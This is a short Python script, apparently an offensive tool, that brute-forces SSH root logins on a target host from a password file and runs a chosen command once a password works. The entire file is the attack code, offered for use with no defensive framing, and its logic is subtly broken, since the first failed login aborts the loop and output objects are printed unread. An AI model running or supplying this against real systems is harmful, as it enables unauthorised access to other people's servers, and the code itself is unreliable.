#!/usr/bin/python3

'''
single thread ssh bruteforcer
'''

import sys
import paramiko

if len(sys.argv) != 5:
    print("usage: {} <password file> <cmd> -t <target>")
    sys.exit(1)

PASSWORD = sys.argv[1]
COMMAND = sys.argv[2]
TARGET = sys.argv[4]
USER = "root"


def run():
    '''
    main
    '''
    passwords = []
    for password in open(PASSWORD).read().split('\n'):
        passwords.append(password)

    try:
        client = paramiko.SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.WarningPolicy)

        for pwd in passwords:
            client.connect(TARGET, port=22, username="root",
                           password=pwd, timeout=5)

            _, stdout, stderr = client.exec_command(COMMAND)
            print("exec {}:".format(COMMAND))
            print(stdout, stderr)
    except (paramiko.SSHException, paramiko.ssh_exception.NoValidConnectionsError):
        return
    finally:
        client.close()


if __name__ == "__main__":
    try:
        run()
    except (KeyboardInterrupt, EOFError, SystemExit):
        pass
    except paramiko.SSHException:
        sys.exit(1)
